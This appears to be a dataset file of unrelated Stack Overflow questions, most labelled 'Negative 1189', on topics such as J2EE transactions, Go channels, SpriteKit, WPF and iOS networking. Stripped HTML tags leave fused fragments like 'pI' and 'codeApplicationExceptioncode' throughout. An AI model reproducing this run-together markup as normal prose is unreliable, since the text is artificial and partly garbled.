Transaction Suspension in J2EEa dont do thisli ul  p... but see answers for caveats and details.p  pcodejavax.validation.ValidationExceptioncode is a JDK exception I cant modify it to add strongan codeApplicationExceptioncode annotationstrong to prevent wrapping. I cant subclass it to add the annotation its thrown by EclpiseLink, not my code. Im not sure that marking it codeApplicationExceptioncode would stop Arjuna AS7s JTA impl wrapping it in a codeRollbackExceptioncode anyway.p  pI tried to use a strongEJB3 interceptorstrong like thisp  precodeAroundInvoke protected Object exceptionFilterInvocationContext ctx throws Exception      try          return ctx.proceed      catch ValidationException ex          throw new SomeAppExceptionex       codepre  p... but it appears that interceptors fire eminsideem JTA which is sensible and usually desirable so the exception I want to catch hasnt been thrown yet.p  pI guess what I want is to be able to define an exception filter thats applied strongafterstrong JTA does its thing. Any ideasp  hr  pIm working with JBoss AS 7.1.1.Final and EclipseLink 2.4.0. EclipseLink is installed as a JBoss module as per a hrefhttpscommunity.jboss.orgwikiHowToUseEclipseLinkWithAS7these instructionsa, but that doesnt matter much for the issue at hand.p  hr  pstrongUPDATEstrong After more thought on this issue, Ive realised that in addition to JSR330 validation exceptions, I really also need to be able to trap  a hrefhttpdocs.oracle.comjavase6docsapijavasqlSQLIntegrityConstraintViolationException.htmlSQLIntegrityConstraintViolationExceptiona from the DB and a hrefhttpwww.postgresql.orgdocs9.1staticerrcodesappendix.htmldeadlock or serialization failure rollbacks with SQLSTATE 40P01 and 40001 respectivelya. Thats why an approach that just tries to make sure commit will never throw wont work well. Checked application exceptions cant be thrown through a JTA commit because the JTA interfaces naturally dont declare them, but unchecked codeApplicationExceptioncode annotated exceptions should be able to be.p  pIt seems that anywhere I can usefully catch an application exception I can also  albeit less prettily  catch an EJBException and delve inside it for the JTA exception and the underlying validation or JDBC exception, then do decision making based on that. Without an exception filter feature in JTA Ill probably have to.p

Negative 1189 pI need to be able to store and lookup generic strings.  I dont know much about the content of the strings, a little more then 23 are human language words with the rest being something closer to a UUID or numberletter combo.  I know that any particular grouping will be constant ie if it has some human words it will be all human words, if it has some UUID all the contents will be UUIDs etc.p  pI need to decide if I should place this data in a map or a hashmap to get the best average lookup rate.  Im inclined to say map with the Olog n runtime because I dont believe I can make a proper efficient hash for strings when I know so little about their input format.  Any thoughts as to which would be betterp  pEDIT I forgot one key aspect.  I dont know the length of the strings and so am concerned memory usage may grow too lage for long strings.  If I used the hash method I would do something where after X characters the hash doesnt hash on a percharacter basis to avoid the memory consumption being too huge.p  pWhat I would really like is a hash map implementation that keeps multuple values in the bucket sorted in an ordered manaer so it can offer a log N search of the buckets but I dont think that exists in stardrd C and its not worth writeing from scratch.  p  ppps. the data is nearstatic.  which Ill occasionally have to add to the list its rare and Im willing to accept a slow write time.  I only care about the lookup time.p

We are trying to centralize configuration, and in doing this we want to keep connection strings out of our webapp.configs we have somewhere around 150 deployed hosts, so the overhead is becoming significant. However, this breaks down since the config file read is hardcoded here, and the codeConnectionStringscode collection is read only there are workarounds, but they are all quite dirty. p  pOne possible way out of this is to extract these lines into a virtual method and then change it with inheritance. This is not so nice when we want to update Massive though, and also calling virtual methods from a constructor is potentially bad. p  pWhat other alternatives do I have Main priority here is to minimize impact when updating. p

Negative 1189 pI have a problem where I am going to have a bunch of nbodies  the movements of each is predescribed by existing data, however when a body is in the range of another one certain properties about it change. For the sake of this question well just assume you have a counter per body that counts the time you were around other bodies. So basically you start with t  0, you spend 5 seconds around body 2, so your t is now 5. I am wondering whats the best way I should go about this, I dont have the data yet, but I was just wondering if its appropriate for me to explore something like CUDAOpenCL or should I stick with optimizing this across a multicore cpu machine. Because the amount of data that this will be simulated across is about 500 bodies, which each have movements described down to the second over a 30 day period, so thats 43200 points of data per body.p
Negative 1189 pHi I am trying to create a new CSV file from merge of specific fields in two CSV files based on a common column or primary key.

Negative 1189 pI have a NuGet package for a library that is currently implemented only for .NET 4. But I have ported library code to support various platforms WinRT, SL5, WP8 so ideally I would like to package it as a portable class library PCL to simplify the maintenance. But the library is using LINQ to XML XELements etc. that requires targeting .NET 4.0.3 and installting .NET 4.0.3 on a client machine.p  pSo I have a dilemma regarding how to target plain .NET 4. If it was not about NuGet packages and I had a control of the user base I could simply state as a prerequisite installing .NET 4.0.3 runtime. However, I dont want to limit the user base in any way, so it looks like I will have to have two versions of the library portable that targets .NET 4.5, SL5 and WP8 and nonportable targeting just .NET4. Whats silly is that both libraries will have exactly the same code since LINQ to XML is of course supported in .NET 4, its just PCLs that dont have such support when targeting .NET 4.p  pMy first question is whether this seems to be a right strategy The alternative would be to take away all XElementdependent code from PCL and have it in nonportable parts, but this does not seem right because the code will be exactly the same for all libraries.p  pThe second question is whether it makes sense to target .NET 4.0.3 from a PCL at all if I have separate version targeting .NET 4 will users that have .NET 4.0.3 runtime installed gain anything from getting a PCL rather than plain .NET 4 version I know .NET 4.0.3 has other improvements but those dont affect my library.p

Negative 1189 pAfternoon All,p  pI am creating a series of graphs and line charts to report data on.p  pOne of the graphs my user requires is a bar graph that essentially holds two values and im not too sure this can be done Essentially the graph he has drawn has a range from 40 to 40.  He wishes the range from 0  40 to report on one value and the range 0 to 40 to hold the other value.  p  pI have already created a stored procedure to pull back the data with the two sets if values for my two meters but cant figure out a way to show this in a bar graph.p  pMany thanks in advance.p  pRegards Betp

So when a user gives an image pathlocaldirectoryUrl, I want to show him that image in codeltimggtcode tag in the viewer. But I dont want to upload the file to server yet. Is there any way that I can upload the file in HTML5 storage and use it to show image My colleague suggested that I create a temp directory on users system and keep the files there. I want to avoid this because if the user exits the project improperly I will not be able to remove my temp folder. So any suggestions or tutorials would be nice.p  pRegards Jehanzeb Malikp

Negative 1189 pIm using the Jquery UI Menu API to create a navigation menu in an application.p  pThe menu draws and links fine, and when hovering over it, the natural jquery ui css is applied, giving hovered elements the uistatefocus class. When you move the mouse off of the element, it removes this class, which puts the element in the default unhighlighted state.p  pI have experimented with adding the standard jquery ui css class uistateactive which applies particular CSS to the element in the menu given this class. However, when hovering any other element, this uistateactive class is REMOVED from the active element, effectively making the hover kill the active selection even though a new selection has yet to be made with a click.p  pI want to be able to keep the hovering classes adding, but leave the ACTIVE class intact so that on each page, the active menu element will always have the active class.p  pAny ideas on the proper way to mark elements active in jquery UI menu apip

Negative 1189 pI am using Spring Batch. I have a sql statement which is built up from multiple xml file elements. All of the results come from the same table, but each of the statements have a different XXX as keyValue. I have extended both a JdbcCursorItemReader, where I use a setSql to set the sql String and this works fine. However performance isnt great and it cant be multithreaded. I then switched to extending a SqlPagingQueryProviderFactoryBean and adding a thread pool executor to my tasklet and for one simple sql statement I have noticed a significant decrease in time.      What I need to know is how to use my complex sql with unions and the SqlPagingQueryProviderFactoryBean, is this possible. Surely this component can deal with more than a simple select from where clause.p

I dont want any fancy frills etc, just something that works.  Preferably one control I can drag into the tool box in codeVScode, register at the top and work with.  I have been playing around with many versions the last few days and I cant get one to work.  They normally seem to include too many files for me or something stupid.

Negative 1189 pI have an MS Access form that has a combo box which acts as a primary key called codecboProjectIDcode. I am trying to create the form in a way so that once a selection is made in the codecboProjectIDcode combo box, it triggers another combo box called codecboErrCod1code to display error codes based on those available to the projectid selected in the codecboProjectIDcode combo box.p  pOnly certain Error Codes are available to certain Project IDs and those are defined in another table. However, i have created a query called codeHDRERRCODEScode that relates codeProjectIDcode, codeProjectCodecode and the possible codeErrorReasonCodecode s available to a specific codeprojectIdcode.p  pFor example, a project code which is selected from the cboProjectID combo box could look something like these FI0105, FI0101, SY0202 etc. Once selected, the codeProjectIDcode is stored in the table codeProjectDTAREVTcode this is the table that the form stores its information and the codeProjectIDcode is simply a next up number 1,2,3,4 etc. etc..    p  pI understand that you need to use a Recordset to return multiple values when doing VBA code.

Negative 1189 pIm fairly new to golang, so Im sure that this question is largely due to some conceptual shortcomings on my part.p  pIn golang, we can have two types of channels unbuffered and buffered synchronous and asynchronous, respectively.p  precodeunbufferedChan  makechan string bufferedChan  makechan string, 100 codepre  pTwo goroutines communicating via an unbuffered channel must wait on each other.  That is, the receiving goroutine blocks until the sender sends, and the sender blocks until the receiver receives.p  pIn the buffered case, the receiver blocks only if the channel is empty.  The sender blocks only if the channel is full.p  pBy using the buffered channel, I expected to decrease the amount of time the goroutines were blocking, and therefore increase the speed of the code.  Instead, it all went slower.  Contrary to my expectations i.e., Buffered is more efficient the unbuffered channel ended up being substantially faster.p  pHeres all the code. strongYoull need to codego get code.google.compgohtmltransformhtmltransformcode first.strongp  precodepackage main  import      fmt     mathrand     os     sync     time     sel code.google.compgohtmltransformcssselector     h5 code.google.compgohtmltransformh5     gnhtml code.google.compgo.nethtml    Find a specific HTML element and return its textual element children. func main      test   lthtmlgt   ltheadgt     lttitlegtThis is the test documentlttitlegt     ltstylegt       header colorblue     ltstylegt   ltheadgt   ltbodygt     ltdiv idh classheadergtThis is some textltdivgt   ltbodygt lthtmlgt       Get a parse tree for this HTML     h5tree, err  h5.NewFromStringtest     if err  nil          dieerr          n  h5tree.Top       Create a Chain object from a CSS selector statement     chn, err  sel.Selectorh     if err  nil          dieerr            Find the item.

Negative 1189 pIm checking for certain condition inside a loop, if that condition is met then I want to initiate a new thread.p  pWithin the thread I make an update, that update will have effect on the condition on the next iteration.p  pMy concern is that the thread wont finish such as update database or call remote resource until the next iteration and at the next iteration the condition will still evaluate the same so will have two or more threads run before the update is initiated.p  pI cant have any timerwait or anything like that. The loop has to be running constantly and instantaneously.p  pA solution Im thinking is to have a flag which gets updated inside the thread, and condition checks this same flag until the thread is finished.p  pThanks for any feedback or suggestions.p

Negative 1189 pWe have a website showing videos to our users running on multiple web servers in a distributed environment. We are going to introduce a new feature where we only show videos to our users that they have not seen before whenever they come online.

This requires maintaing this state in the backend and updating it in realtime. We have enough traffic to rule out mysql for updating this information in realtime.

Negative 1189 pIve been working on a level reader in Java that pulls the level data from an XML document for my game. Everythings been going fine however I have hit an issue. One thing Im pulling from the document is the ID of the game object to create. I have a bunch of classes such as wall,player and coin all of which extend a GameObject class. I want to have a method in the GameObject class that returns a GameObject based on the ID. Something like thisp  precodepublic GameObject CreateGameObjectint id, int x, int y, GameScreen parent      Type type  getTypeFromListid     Type gobj  new Typex,y,parent     return gobj  codepre  pI know I can do this using a bunch of if statements checking the ID and returning the correct one but I want the code to be clean and more versatile. If you could please help show me how to do this or show me another way that would be very much appreciated.   p

Negative 1189 pI am developing a app in ruby on rails, and I reached a point where I dont know what is my best solution for the fallowing scenario. So far I am able to create Users, create projects, associate users something like on FB, I am able to invite users to my website and now I would like to allow users to give different levels of access to projects that they created, to other userssomething similar with github. Also the users after creating the account they will get a role of superadmin, like that they will be able to manage their on projects, or assign projects to their associates. So which will be my best option between cancan and declarative authorization. Also do I need a table which will store the userid, roleid, and projectid if I will use cancan or declarative authorizationp  pThank youp  hr  pI will explain my problem better. So far I have User with devise which are able to create projects. So, if  user1 creates project A and project B I want him, to be able to assign user2 with role admin on project A, and user2 with moderator role on project B.  I was thinking in creating a UserRoleProject link table, is it a good idea Or if not please help me with some pointers.p  pThe action will be something like, User1 select from a list user2, select a project from another listthat user1 created, and select the role that the user2 will have on that project.p  pAny user will be able to perform the same action on their projects. Also there will be n projects and n users and 3 access levelsadmin, moderator, guestp  pThank youp

Negative 1189 pI am new to d3 and am using Interactive Data Visualization for the Web by Scott Murray which is great btw to get me started. Now everything I saw so far works as described but something got me confused when looking at the procedure to create a new element. Simple example from Scott Murrayp  precodesvg.selectAllcircle     .datadataset     .enter     .appendcircle codepre  pThe name codecirclecode is used for the codeselectAllcode which returns an empty selection which is ok as I learned. Then circles are appended by putting the same name into the code.appendcode. Greatp  pNow what got me confused was what happens when you want to do the same thing again. So you have a second dataset and want to generate new circles in the same way. Using the same code just replacing the dataset will obviously not work as the codeselectAllcirclecode will not return an empty selection anymore. So I played around and found out that I can use any name in the codeselectAllcode and even leave it empty like this codeselectAllcodep  pScott Murrays examples always just use one type circle, text, etc. per dataset. Finally I found in the official examples something likep  precodesvg.selectAllline.left     .datadataset     .enter     .appendline     .attr ...  svg.selectAllline.right     .datadataset     .enter     .appendline     .attr ... codepre  pNow my question How is this entry in codeselectAllENTRYcode really used Can it be utilized later to again reference those elements in any way or is it really just a dummy name which can be chosen in any way and just needs to return an empty selection I could not find this entry anywhere in the resulting DOM or object structure anymore.p  pThank you for deconfusing me.p

Negative 1189 pIve been coding my own http web server in C using the TcpListener class. Now before anyone mentions this, I know of the HttpListener, but after using that previously, I.ve had some issues with it due to firewall exceptions and needing to have an admin account etc etc. For my application, its just easier to make a simple, built web server. Ive been using a python application to connect to my C webserver, and send a simple GET request, and receive in return a simple response.p  pMy question is this.. Is the server supposed to close the connection, or the client I ask because if i close the connection in the server after sending the response, my Python app doesnt always get to read ALL of the response. Instead, a socket error will be thrown Error 10054, Connection reset by peer. But, if I force the python app to close the connection, Im not sure how to detect that on my C server, since C TcpClient does not contain a disconnect event. So what do i do How do i know when the connected client has received the full response so i can close the connectionp  pCurrently, this works with a thread sleepp  precode Write headers and body to the Socket         NetworkStream Stream  Client.GetStream           Write Headers         byte[] Buffer  Encoding.UTF8.GetBytesHeaders         Stream.WriteBuffer, 0, Buffer.Length           Write Response Data if Request method is not HEAD         if Request.RequestMethod  HttpRequestMethod.HEAD             Stream.WriteBodyByteArr, 0, BodyByteArr.Length          Stream.Flush          System.Threading.Thread.Sleep100         Stream.Close         Client.Close codepre  pI think that i need a better alternative then Thread.Sleep, which probably doesnt work either if the client takes more then the sleep time to receive the response Slow Connectionp  pHeaders Sent to the Http Serverp  precodeGET test HTTP1.1 Host 127.0.0.1 Connection close codepre  pHeaders sent back to clientp  precodeHTTP1.1 200 OK Date Now Server MiniHttpASPServer ContentType textplain charsetutf8 ContentLength length Connection close  contents codepre

Negative 1189 pI am sending emails with the codemailcode gem, using the very simple code below. When Im sending an email, the codesmtpaccount.usernamecode and the codesmtpaccount.fromcode could be e.g. codesupportthebestcompany.comcode. This causes the recipient to see that he has received an email from codesupportcode you know, in his inbox where he can get an overview of his last x emails. How can I specify this, so the recipient gets to see something more interesting, like e.g. codeThe Best Companycodep  precoderequire mail  class SmtpMails    def self.sendmailssmtpaccount, to, subject, text     options         address              gt smtpaccount.address,       port                 gt smtpaccount.port,       domain               gt smtpaccount.domain,       username            gt smtpaccount.username,       password             gt smtpaccount.password,       authentication       gt smtpaccount.authentication,       enablestarttlsauto gt smtpaccount.enablestarttlsauto           Mail.defaults do       eliverymethod smtp, options     end      mail  Mail.deliver do       to to       from smtpaccount.from       subject subject     end   end end codepre
Negative 1189 pI am going to implement a job based threading architecture. That means on the one hand, there is a queue where the main thread can append jobs to. On the other hand there are worker threads, dependent on the number of available CPU cores, consuming those jobs and removing them from the queue.p  pNow, there are two approaches to implement that in C coming to my mind. The first one is template based. There is a codeTaskcode template representing one job. It holds a function, which might be a lamda and provides access to the data.p  pTo use this, wed have to store something in the codeWorkcode function object, like a lambda expression. Moreover, we need to point the codeDatacode pointer to our data object and set codeEmptycode to false after that. Of course than the object must be attached to the job queue. A worker thread fetching the job will lock codeAccesscode, and the main thread can check the lock to get free every some time to work with the result then.p  precodetemplate ltclass Tgt class Task  public     Task              Empty.storetrue         Data  nullptr          stdmutex Access     stdatomicltboolgt Empty     stdfunctionltvoidTgt Work     T Data  codepre  pThe second approach is inheritance based. The empty flag and mutex remain like in the first approach. But the work function is a real method which wants to get overridden. Furthermore, we dont need the data pointer anymore since an derived task can add whatever members it wants to.p  precodeclass Task  public     Task              Empty.storetrue         Data  nullptr          stdmutex Access     stdatomicltboolgt Empty     virtual void Work  0  codepre  pJust to make it more clear, here are two short examples of how I would start jobs from within the main thread. Lets start with the first one.p  precodeint number  Taskltintgt example  new Taskltintgt example.Data  ampnumber example.Empty.storefalse example.Run  []int number     number  42   Queue.pushbackexample codepre  pAnd for the second approach.p  precodeclass Example  public Task  public     Exampleint number              thisgtnumber  number          void Work              number  42          int number   int number  Example example  new Exampleampnumber     example.Empty.storefalse  Queue.pushbackexample codepre  pWhat are the difference in performance and flexibility of those two approachesp

Negative 1189 pAssume you have a function that normally can never fail, for examplep  precodestdstring convertintegertostringint x codepre  pIn pricipal, this would be a candidate for codenoexceptcode. However, the implementation most likely involves involves dynamic memory management, so it could always throw a a hrefhttpwww.cplusplus.comreferencenewbadallocstdbadalloca when allocating memory with the codenewcode operator.p  pstrongIs it recommended to annotate the function as noexceptstrongp  pFrom a practical point of view, it is extremely difficult to handle outofmemory situations in a reasonable way. Most programs just assume that there is enough memory available. Calling codestdterminatecode, as it would happen if a codenoexceptcode function throws codestdbadalloccode, seems to be reasonable in that case. p  pFor me codenoexceptcode is some form of documentation. It is a promise that you or the optimizer can safely assume that this function will never throw. If you are programming an application that doesnt care about outofmemory situations, it is still a valid assumption.p  pI guess the safest recommendation is to never use codenoexceptcode if a codestdbadalloccode exception could be thrown. On the other hand, I wonder if there are advantages to use codenoexceptcode anyway, assuming that you dont care about outofmemory situations i.e., if codestdterminatecode is OK.p

Negative 1189 pI have recently added a window to my WPF application which can be docked to an edge of the desktop as an app bar.  The code Im using to do the docking came from a hrefhttpstackoverflow.comquestions75785howdoyoudoappbardockingtoscreenedgelikewinampinwpfthisa stackoverflow post.p  pThe program has three user settings defined related to this window.  One is the edge where the window is docked, the other two are the values of the codeLeftcode amp codeTopcode properties.  The idea is that when the window is closed, or the program is shut down, the window will open back in the same state and location when the program restarts.p  pThe problem Im having is that when the program opens up, the window is first displayed at a random location on the screen probably the coordinates assigned to it by Windows when the window is created and then it moves into the docked position.  Other programs Ive seen that have the app bar functionality, like Trillian, are drawn in the docked position from the beginning.  Its a little disconcerting to see the window move like that.p  pHere is some code from the windowp  precodeprivate void AppBarWindowActivated object sender, EventArgs e       if  Settings.Default.AppBarWindowEdge  ABEdge.None           AppBarFunctions.SendShellActivated this         private void AppBarWindowClosing object sender, CancelEventArgs e       Settings.Default.AppBarWindowLeft  Left     Settings.Default.AppBarWindowTop   Top     Settings.Default.Save      AppBarFunctions.SetAppBar this, ABEdge.None        Other, app specific code . . .   private void AppBarWindowLocationChanged object sender, EventArgs e       if  Settings.Default.AppBarWindowEdge  ABEdge.None           AppBarFunctions.SendShellWindowPosChanged this         private void AppBarWindowSourceInitialized object sender, EventArgs e       if  Settings.Default.AppBarWindowEdge  ABEdge.None           SizeWindow Settings.Default.AppBarWindowEdge  ABEdge.None  ABEdge.Left  ABEdge.None         private void AppBarWindowSizeChanged object sender, SizeChangedEventArgs e       if  Settings.Default.AppBarWindowEdge  ABEdge.None           AppBarFunctions.SendShellWindowPosChanged this         private void SizeWindow ABEdge originalEdge        App specific code to compute the windows size . . .      if  originalEdge  Settings.Default.AppBarWindowEdge           AppBarFunctions.SetAppBar this, Settings.Default.AppBarWindowEdge            Settings.Default.AppBarWindowLeft  Left     Settings.Default.AppBarWindowTop   Top     Settings.Default.Save  codepre  pI have added functions to call codeSHAppBarrMessagecode when the window is activated, or when its position and size change, as I read in a hrefhttpwww.codeproject.comArticles3728CdoesShellPart3 relnofollowthisa acrticle.  The calls dont seem to have any effect on the behavior, so I might remove them.p  pI know that the codeSourceInitializedcode and codeLoadingcode events are called before the window is displayed but after the window handle and the layout amp measure passes have been completed.  It appears, though, that the window is rendered before the call to codeAppBarFunctions.SetAppBarcode is made, which is why I see it appear and then move into place.p  pIve also tried to move the window into the docked position by setting the codeLeftcode and codeTopcode properties to the values saved in the settings in the windows constructor.  That didnt work, either.  In fact, it was worse, as the window was first drawn in the docked position, then apparently was moved away from that desktop edge to make room for it, and then moved back into the docked location.p  pHow do I get this window to appear in the docked position upon start up and not move afterwardp  pEditp  pI think I have found the cause of the problem.  There is a comment in the codeAppBarFunctionscode class code, in the codeABSetPoscode method, just before it schedules a call to the codeDoResizecode method on the windows codeDispatchercode UI thread.  The comment readsp  precode This is done async, because WPF will send a resize after a new appbar is added.    if we size right away, WPFs resize comes last and overrides us. codepre  pSo apparently WPF or Windows is moving the window out of the space being reserved for the window, and I then move it back in.  I added a lot of trace points in my code amp I can see that the window isnt rendered until after that move is made the one mentioned in the comment in the code.  After the window is rendered, it is moved into the docked position by my code.p  pThe codeAppBarFunctionscode class already adds a window procedure hook for wathcing for messages from the shell.  If I add a check for WMWINDOWPOSCHANGED, could I somehow stop the message from being processed  Or maybe I can change the values for the codeLeftcode and codeTopcode properties for the move done by Windows  WPF so the window ends up where I want it to bep

The only remaining problem is that because VS doesnt consider click to go as normal navigation, when you click to go to a definition and try to go back using the Ctrl or mouse back, you will not return to the last position, but to the previous Normal navigation position.br My suggestion to the plugin developer is to try to make VS consider click to go navigation as normal ones, completely solving this issue.p

Negative 1189 pIn an attempt to further familiarize myself with SpriteKit, I made a simple little app that would spawn a random 3 choices ball at whatever location you click or touch which automatically despawn after 7 seconds, then apply physics and gravity, and finish with manipulating gravity at set intervals. It was simple enough and worked quite well. However, I decided to add sound to it so the balls would make noise when hitting both the walls or each other. p  pWhile it emworkedem, it brought up an issue I couldnt figure out on my own the soundless version would lag if you spawned so many balls it couldnt handle it, but the sound version continued to lag thereafter.

The soundless version didnt expand on the memory NEARLY as much and additionally reclaimed some bits after the balls had been removed from their parents.p  pI cant help but think there was something wrong in my implementation thats not only keeping the sound files around in memory after theyve been used, but keeping multiples of each file.p  pIll happily share my project with anyone who requests, but this is the approximation of the methods that happenp  pinitialization, sound actions are created and stored in the scene class so they can be accessed laterp  precodeinterface REPBalls       SKAction ballSound01  end  implementation REPBalls  ... ... ... void setUpSounds      NSArray array  [ ballhit01.wav,] I have more in the array, Im just simplifying code for stackoverflow      ballSound01  [SKAction playSoundFileNamed[array objectAtIndex0] waitForCompletionNO]   codepre  pI then have a contact listener activate a method that randomizes from the available sound actions and returns one of themp  precodevoid didBeginContactSKPhysicsContact contact  SKPhysicsBody firstBody, secondBody  firstBody  contact.bodyA secondBody  contact.bodyB  SKAction randomSound blah blah blah if categories match and whatnot, do this         REPBallSpawn ball  REPBallSpawn firstBody.node         randomSound  [self soundBankRandomizerYES]          [ball runActionrandomSound] codepre  pAnd the method that randomizesp  precodeSKAction soundBankRandomizerBOOLisWallHit  NSArray array switch isWallHit      case YES         array  [ according sound actions               ]         break      case NO         array  [                 ballSound01, and other sound actions                   ]      default         array  [                   if neither case is true somehow, just choose from a bank of all sound actions                   ]         break   int randomChoice  arc4random  [array count]     SKAction sound  SKAction[array objectAtIndexrandomChoice] return sound  codepre  pBeyond that, after 7 seconds the balls automatically despawn themselves, and I would assume any children with them which I also assume should include actions, such as sound actions.p  pI even made a method to confirm no nodes are sticking around after they despawnp  precode[self enumerateChildNodesWithName usingBlockSKNode node, BOOL stop          string  [NSString stringWithFormat    , string, node]     ] codepre  pThe result is then copied to the clipboard which results in a list of all nodes and children in the scene at the moment. the      is in there for a unique pattern to search for in findreplace to make new lines p  pEdit I also noticed that CPU usage remains high after everything has despawned as well.p  pPlease tell me I did something wrongp  pp  pSo I made some changes to my code.

See RFC 2183 [49] which updates RFC 1806 for details.p blockquote  pemAnd from a hrefhttpwww.ietf.orgrfcrfc2183.txt relnofollowRFC2183a I getemp  blockquote   pSince this memo provides a way for the sender to suggest a filename,br   a receiving MUA must take care that the senders suggested filenamebr   does not represent a hazard.

Negative 1189 pI am looking at using Ember.js for a new, Railsbacked, app using Active Model Serializers.

I am hoping someone who is a little ahead of me in this can understand what I am driving atp  pReally I think it boils down to 2 questionsp  p1How to properly filter out information on requests so that only the local objects are filled in i.e. on a call to an index method I need a list of event days without children, but on a call to a show method I need a single event day filled with the next level downp  p2 How to get Ember to reload an object at the appropriate time to fill out the appropriate contentp  pMaybe I am looking at this wrong  missing the point of something like Ember  and if so I welcome pointers to appropriate tutorials but I cant find anything even on the Ember site that explains how to do anything other than load the whole tree at once.

Negative 1189 pIve run into a bit of a problem. To do what Im attempting, I need to be able to enter pure hex values into the standard input of the command line specifically into a gets call which is inside of the program without using IO redirection. I generally have success by using ctrl  u  number to enter ascii characters equivalent to the entered hex value, but I need to be able to enter null charsbackspacesetc which the terminal either ignores or interprets as an action rather than a character. If I use pipes or IO redirection, I cant interact with the program after the initial input and the program closes. Would anyone have any ideas Im thinking possible solutions are eitherp  ol liFind a way to type the characters in manually and have them preservedli liFind a way to enter the characters in that isnt unicode or ascii but will still be accepted as byte information li liFind a way to pipe or redirect input to the program that is interpreted as from the command line, and then somehow convince it to give control of input back to the command line immediatelyli ol  pThe third one Im not even sure is possible or useful since Im not totally sure why the program isnt working if it gets information from anything but the command line directly, all I know is that I have to enter it manually or else it wont run. Would anyone have any ideas for any of those 3 options, or any others you can think of Im stumped.p  pOh, also, if anyone can explain why sometimes ctrlunumber outputs characters with completely different hex values from the entered number, Im very curious, but I dont think itll help me with my current problem anyways.p

Negative 1189 pI am brand new to this. I wished to used some js library and I followed the way they explained on how to install it which is through codenodecode package management.

Negative 1189 pI am building a new MVC website with security managed by a default membership provider. The site will use Umbraco 7 for its structure and a certain amount of content editing but the core of the site will be a bespoke ASP.NET MVC application with its own users and business rules around user accounts.p  pUmbraco has its own membership provider. Certain users in my site will also be content editors in Umbraco, but I dont want them to have to login to Umbraco separately. Is this possible I should point out I dont want to use Umbraco to manage the bulk of my sites users who will have nothing to do with content editing.p  pIve read a lot about extending the UmbracoDefaultProvider, but this always presupposes that all user accounts are being managed by the Umbraco back office.p  pAny guidance appreciated.p  pstrongEditstrongp  pHaving analysed this a bit further Im still pretty new to Umbraco Im asking if its possible to link member types with user roles, so an authenticated member can access the Umbraco back office and edit content. In my proposed system Ill have people who have a role in the main website Umbraco members who will also be responsible for content editing Umbraco users. Seems silly that they have to log in separately for each of these responsibilities but from research it seems to be impossible. Would be grateful if anybody could confirm.p

Negative 1189 pSo Im working on porting my cocos2d game to Sprite Kit. p  pIn cocos2d I had 2 situations where I would overlay a menu over the entire game scene. The first case is pause, and the second case is game over.p  pIn cocos2d for the game over I didp  precodeCCScene runningScene  [[CCDirector sharedDirector] runningScene] WaveEndLayer waveEndedLayer  [[WaveEndLayer alloc] initWithWondidWin] [waveEndedLayer setOpacity0] [runningScene addChildwaveEndedLayer zkZHUD] CCFadeTo fadeIn  [CCFadeTo actionWithDuration0.5 opacity255] [waveEndedLayer runActionfadeIn] codepre  pThe WaveEndLayer class had some CCMenuItems on it, and cocos2d handled passing the touch events to their handlers. p  pWhat is the proper way of doing something like this in sprite kit p  pWhat should my game over class inherit from codeSKNodecode, codeSKViewcode, codeSKScenecodep  pI tried using an codeSKScenecode, but you cant have 2 running scenes or am I wrong, so I was adding the scene as a child to the main game scene. But the touch events were only getting called on the main game scene, not on the game over scene. So I tried something likep  precode voidtouchesEndedNSSet touches withEventUIEvent event      UITouch touch  [touches anyObject]     CGPoint location  [touch locationInNodeself]      if gameOver              [gameOverScene touchAtLocationlocation]       codepre  pBut for simplicity purposes Im not resetting the state of everything when I restart a level, Im just pushing the game scene again, which it didnt like since it was technically still running.p  pAnyways, whats the proper way of overlaying a menu that needs touch eventsp

Im using the following setupp  precodeimport sys  from cxFreeze import setup, Executable    base  None if sys.platform  win32     base  Win32GUI  setup         name  simpleTkinter,         version  0.1,         description  Sample cxFreeze Tkinter script,         executables  [Executablethe timer.py, base  base] codepre  pIf i just open my code and run it the interface works perfectly. I do not get any error messages while doing the build at least none that i can see... btw, how do i verify this. Any ideas on what the problem could be or any other alternative modulesp  pThanks p

Maybe it is not the solution Im finding but the name has drawn my attention.

However, asking the user to enter their own name is a prone to error and variation, and b unnecessary as they should already be logged in. So, if I use GetActiveUser to retrieve their ID nothing is returned as the script is running as me. GetEffectiveUser is ok but always returns my ID. Is there any way I can find the actual users ID in a script running as me.p  pAlternatively, the users could upload their files to their own Drive and share them with me.

Something like thisp  precodeFactory.buildManyconditions,          temperature              vary [0, 15, 10, 14.9, 32F]              ,      expected false ,     function conditionsSet          testAllisWarm, conditionsSet, expectedResultSet          test passes          test passes          test passes          test passes          test fails        Factory.buildManyconditions,          temperature              vary [16, 15.1, 99999999999999999999999999, 20C]              ,      expected true ,     function conditionsSet          testAllisWarm, conditionsSet, expectedResultSet          test passes          test passes          test passes          test fails       codepre  pThis of course is too simple an approach if different values must be tried for multiple properties, but you get the idea. Am I not correct in assuming this is a common thing to do when testing in javascriptp
Negative 1189 pI am currently developing an ios app for a localization company. The company provides ipads to all his employees so this new app that im developing can keep track of them in case of an emergency and to know if they are really working.p  pI already finished the app and everything is working fine but now the problem is that anyone can close the app and hide his position from us.p  pIt is possible to do something about thisp  pAlso it is possible to start an app on boot. Something like a hrefhttpstackoverflow.coma63920093307382thisa but on Ios.p  pIs there anyway to lock the app so it cant be closed and only sent to backgroundp  pThanksp  pstrongEDITstrongp  pI tried with the guided access but the employees also need to use other apps like safari to do their work. Not only mine. I tried this and effectively you cant close the app but also you cant access other app. Or am I doing it wrong I want to allow my app to be in background but not close.

Negative 1189 pI need to connect an iOS device iDevice to a WiFi access port but keep using the cellular data connection.p  pDefault behavior is for iOS to set the WiFi connection as the default gateway, routing all internet traffic there. In my case the access point is a black box device supplying a WiFi network to access its services, but not the internet. p  pOne solution which we have tried, is to make the iDevice the access point hot spot and have the black box device connect though it. This is far less desirable as the black box device has no UI. So it is difficult to setup.  We have lessened the pain by using Bonjour but still...p  pIs it possible to make a system call iOS application to restore the gateway setting back to the cellular gateway after the iDevice joins a WiFi networkp  pWould be even better if there is some way to setup the iDevice IPhone or IPad to maintain its cellular gateway after connecting to a WiFi access point.p

